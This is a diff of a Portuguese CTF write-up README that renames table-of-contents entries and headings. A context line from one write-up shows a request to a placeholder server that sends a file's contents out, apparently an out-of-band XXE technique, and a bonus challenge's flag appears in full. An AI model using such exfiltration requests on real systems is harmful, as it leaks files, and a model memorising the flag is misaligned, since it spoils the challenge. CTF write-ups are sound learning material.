@@ -5,11 +5,11 @@
   * [Exploitation](#exploitation)
     + [Future Message 1](#future-message-1)
     + [Future Message 2](#future-message-2)
-    + [Random Vault (EN)](#random-vault--en-)
+    + [Random Vault (EN)](#random-vault)
     + [Roots Before Branches](#roots-before-branches)
-    + [Baby Recruiter (Resolvido)](#baby-recruiter--resolvido-)
+    + [Baby Recruiter](#baby-recruiter)
   * [Bonus](#bonus)
-    + [The last Resort [READ FIRST]](#the-last-resort--read-first-)
+    + [The last Resort](#the-last-resort)
     + [g00d b0y](#g00d-b0y)
 
 
@@ -198,7 +198,7 @@ print("6")
 ```
 
 
-### Random Vault (EN)
+### Random Vault
 
 Writeup em inglês, devemos postar a tradução eventualmente.
 
@@ -876,7 +876,7 @@ Ao realizar a requisição GET *http://<my-server-ip>:53/collect/%file;*, é env
 
 ## Bonus
 
-### The last Resort [READ FIRST]
+### The last Resort
 `CTF-BR{br0adc4s7_#01_succe55fully_r3c31v3d}`
 
 Só ler o enunciado e pegar a flag
